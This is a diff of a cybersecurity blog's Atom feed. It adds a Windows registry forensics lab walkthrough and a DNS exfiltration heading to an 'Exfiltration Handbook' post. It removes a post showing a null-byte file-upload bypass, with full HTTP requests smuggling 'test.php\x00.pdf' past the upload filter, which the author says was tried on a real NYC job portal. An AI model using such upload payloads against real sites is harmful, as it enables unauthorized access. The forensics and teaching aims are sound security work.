@@ -1,4 +1,45 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2026-01-25T18:26:10-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><entry><title type="html">The Exfiltration Handbook</title><link href="/blog/Data-Exfiltration" rel="alternate" type="text/html" title="The Exfiltration Handbook" /><published>2026-01-24T00:00:00-05:00</published><updated>2026-01-24T00:00:00-05:00</updated><id>http://localhost:4000/blog/Exfiltration</id><content type="html" xml:base="/blog/Data-Exfiltration"><![CDATA[<p>In this guide, I’m breaking down how to “live off the land.” We’re talking about taking standard commands and turning them into tunnels. Whether it’s a quick TCP pipe or a slow-burn DNS play, it’s all about being creative with what’s available.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2026-01-26T19:31:28-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><entry><title type="html">Windows Forensics</title><link href="/blog/Windows-Forensics" rel="alternate" type="text/html" title="Windows Forensics" /><published>2026-01-26T00:00:00-05:00</published><updated>2026-01-26T00:00:00-05:00</updated><id>http://localhost:4000/blog/Windows-Forensics</id><content type="html" xml:base="/blog/Windows-Forensics"><![CDATA[<p>One of the Desktops in the research lab at Organization X is suspected to have been accessed by someone unauthorized. Although they generally have only one user account per Desktop, there were multiple user accounts observed on this system. It is also suspected that the system was connected to some network drive, and a USB device was connected to the system. The triage data from the system was collected and placed on the attached VM. Can you help Organization X with finding answers to the below questions?</p>
+
+<blockquote>
+  <p>1) How many user created accounts are present on the system?</p>
+</blockquote>
+
+<p>Based on the available logs, navigate to <code class="language-plaintext highlighter-rouge">C:\Windows\System32\config\SAM</code>. The SAM hive contains user account, login, and group information, primarily under <code class="language-plaintext highlighter-rouge">SAM\Domains\Account\Users</code>.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*cOWowwnx-k6MLYeF_22hsA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<blockquote>
+  <p>2) What’s the password hint for the user THM-4n6?</p>
+</blockquote>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*NIsIYnyzuHqy6BD6LxgJRQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<blockquote>
+  <p>3) When was the file ‘Changelog.txt’ accessed?</p>
+</blockquote>
+
+<p>navigate to <code class="language-plaintext highlighter-rouge">C:\Users\THM-4n6NTUSER.DAT</code> This information is stored in the NTUSER hive and can be found on the following location:</p>
+
+<p><code class="language-plaintext highlighter-rouge">NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs</code></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*yE1oWyT8moAmW90IimXh0A.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<blockquote>
+  <p>4) When was the USB device with the friendly name ‘USB’ last connected?</p>
+</blockquote>
+
+<p>The following locations keep track of USB keys plugged into a system. These locations store the vendor id, product id, and version of the USB device plugged in and can be used to identify unique devices. These locations also store the time the devices were plugged into the system.</p>
+
+<p><code class="language-plaintext highlighter-rouge">SYSTEM\CurrentControlSet\Enum\USBSTOR</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">SYSTEM\CurrentControlSet\Enum\USB</code></p>
+
+<p>Registry Explorer shows this information in a nice and easy-to-understand way.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*qT03JA4XyB0so6xUwRxXwA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="my-research" /><summary type="html"><![CDATA[<p>One of the Desktops in the research lab at Organization X is suspected to have been accessed by someone unauthorized. Although they generally have only one user account per Desktop, there were multiple user accounts observed on this system. It is also suspected that the system was connected to some network drive, and a USB device was connected to the system. The triage data from the system was collected and placed on the attached VM. Can you help Organization X with finding answers to the below questions?</p>
+
+]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*8vIZ7xENqLJqI9C9ZLBKvA.png" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*8vIZ7xENqLJqI9C9ZLBKvA.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">The Exfiltration Handbook</title><link href="/blog/Data-Exfiltration" rel="alternate" type="text/html" title="The Exfiltration Handbook" /><published>2026-01-24T00:00:00-05:00</published><updated>2026-01-24T00:00:00-05:00</updated><id>http://localhost:4000/blog/Exfiltration</id><content type="html" xml:base="/blog/Data-Exfiltration"><![CDATA[<p>In this guide, I’m breaking down how to “live off the land.” We’re talking about taking standard commands and turning them into tunnels. Whether it’s a quick TCP pipe or a slow-burn DNS play, it’s all about being creative with what’s available.</p>
 
 <h3 id="1-the-udp-socket">1. The UDP Socket</h3>
 
@@ -475,6 +516,9 @@ function togglePerspective(e, container) {
 }
 </script>
 
+<h3 id="dns-exfiltration">DNS Exfiltration</h3>
+
+<p>To perform exfiltration via the DNS protocol, you need to control a domain name and set up DNS records, including NS, A, or TXT.</p>
 ]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="pentesting" /><summary type="html"><![CDATA[<p>In this guide, I’m breaking down how to “live off the land.” We’re talking about taking standard commands and turning them into tunnels. Whether it’s a quick TCP pipe or a slow-burn DNS play, it’s all about being creative with what’s available.</p>
 
 ]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:720/format:webp/1*nOvrIc-KReNi6cpEpPTOEQ.png" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:720/format:webp/1*nOvrIc-KReNi6cpEpPTOEQ.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">byp4ss3d PicoCTF</title><link href="/blog/byp4ss3d_PicoCTF" rel="alternate" type="text/html" title="byp4ss3d PicoCTF" /><published>2025-11-19T00:00:00-05:00</published><updated>2025-11-19T00:00:00-05:00</updated><id>http://localhost:4000/blog/Apache-backdoor-upload</id><content type="html" xml:base="/blog/byp4ss3d_PicoCTF"><![CDATA[<p>A university’s online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded, but are they enough? Take a look at how the upload is implemented. Maybe there’s a way to slip past the checks and interact with the server in ways you shouldn’t.</p>
@@ -1334,119 +1378,4 @@ Type "help", "copyright", "credits" or "license" for more information.
   </div>
 </div>
 
-]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:720/format:webp/1*mZunNj45WXui4CSwhm-Buw.jpeg" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:720/format:webp/1*mZunNj45WXui4CSwhm-Buw.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Null-Byte File Upload Bypass: PoC on a NYC Portal</title><link href="/blog/NYC-DOWN-FUV" rel="alternate" type="text/html" title="Null-Byte File Upload Bypass: PoC on a NYC Portal" /><published>2025-08-29T00:00:00-04:00</published><updated>2025-08-29T00:00:00-04:00</updated><id>http://localhost:4000/blog/NYCFILEUPLOAD</id><content type="html" xml:base="/blog/NYC-DOWN-FUV"><![CDATA[<p>While searching for jobs on a New York City job portal, I decided to create an account and explore the platform’s features. One of the first things I did was update my profile and upload my resume, just like any typical job seeker would. The profile page looked something like this:</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*LfMseQB6u9eC7ER5irMVAA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>As I interacted with the site, I started to notice some interesting behaviors in the file upload functionality. The platform only allowed certain file types specifically PDF and TXT files. Any attempt to upload other or potentially malicious files was blocked.</p>
-
-<p>When uploading a file, you would see a request similar to this:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">burp suite</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="learning-javascript">
-POST /upload HTTP/1.1
-Host: localhost:5000
-Content-Length: 49871
-Cache-Control: max-age=0
-Origin: http://localhost:5000
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvqrfq0aFgpBXXzTT
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://localhost:5000/upload
-Accept-Encoding: gzip, deflate, br
-Accept-Language: en-US,en;q=0.9
-Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.aLHqhg.2zjRjDid41OHk7Nrgl1dXJZ8n70
-Connection: keep-alive
-
-------WebKitFormBoundaryvqrfq0aFgpBXXzTT
-Content-Disposition: form-data; name="file"; filename="rest.pdf"
-Content-Type: application/pdf
-
-%PDF-1.3
-%Äåòåë§ó ÐÄÆ
-4 0 obj
-&lt;&lt; /Length 5 0 R /Filter /FlateDecode &gt;&gt;
-stream.....
-</code></pre>
-</div>
-
-<p>However, if we modify the upload request and change the filename to include a null byte (for example, <code class="language-plaintext highlighter-rouge">test.php\x00.pdf</code>) and set the <code class="language-plaintext highlighter-rouge">Content-Type</code> to something like <code class="language-plaintext highlighter-rouge">application/vnd.microsoft.portable-executable</code>, the server processes the file as <code class="language-plaintext highlighter-rouge">test.php\x00.pdf</code>. This could potentially allow us to bypass the file type restrictions.</p>
-
-<p>Here’s how the modified request would look:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">burp suite</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="learning-javascript">
-POST /upload HTTP/1.1
-Host: localhost:5000
-Content-Length: 49871
-Cache-Control: max-age=0
-Origin: http://localhost:5000
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvqrfq0aFgpBXXzTT
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://localhost:5000/upload
-Accept-Encoding: gzip, deflate, br
-Accept-Language: en-US,en;q=0.9
-Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.aLHqhg.2zjRjDid41OHk7Nrgl1dXJZ8n70
-Connection: keep-alive
-
-------WebKitFormBoundaryvqrfq0aFgpBXXzTT
-Content-Disposition: form-data; name="file"; filename="test.php\x00.pdf"
-Content-Type: application/vnd.microsoft.portable-executable
-
-&lt;--MZ binary content--&gt;
-------WebKitFormBoundaryvqrfq0aFgpBXXzTT--
-</code></pre>
-</div>
-
-<p>This trick can sometimes bypass weak file validation mechanisms, potentially allowing the upload of executable or malicious files.</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*4sE7RSkRelC-XNJeqqNgBg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>Now, when you try to access the uploaded file, the application returns a “Page Not Found” error, and the URL looks like this:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost:5000/file/filename.php/x00
-</code></pre></div></div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*yPJ1-vbmpXkK2wkQYowPtA.png" alt="Null byte file download demo" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>However, if you manually remove the <code class="language-plaintext highlighter-rouge">/x00</code> from the URL so it becomes:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost:5000/file/filename.php
-</code></pre></div></div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*FUQ2f6XnHFX7cxqhFNDRFg.png" alt="Null byte file download demo" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>you are able to download the uploaded PHP file directly.</p>
-
-<p>Below is a demonstration of replicating this vulnerability on a test environment (not the NYC job portal), but the screenshots above are from the real site:</p>
-
-<h2 id="video-demonstration">Video Demonstration</h2>
-
-<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/p3waRC1e7jo" frameborder="0" allowfullscreen="" style="position: absolute; top:0; left: 0; width: 100%; height: 100%;">
-  </iframe>
-</div>
-
-<p><strong>Thank you for reading!</strong> If you found this post helpful or interesting, stay tuned for more cybersecurity stories and insights. See you</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*83hlWRWOv-NhKdltd1awtg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="bug-bounty" /><summary type="html"><![CDATA[<p>While searching for jobs on a New York City job portal, I decided to create an account and explore the platform’s features. One of the first things I did was update my profile and upload my resume, just like any typical job seeker would. The profile page looked something like this:</p>
-
-]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*dIWSWrtC08kIaoVTLITp5w.jpeg" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*dIWSWrtC08kIaoVTLITp5w.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:720/format:webp/1*mZunNj45WXui4CSwhm-Buw.jpeg" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:720/format:webp/1*mZunNj45WXui4CSwhm-Buw.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
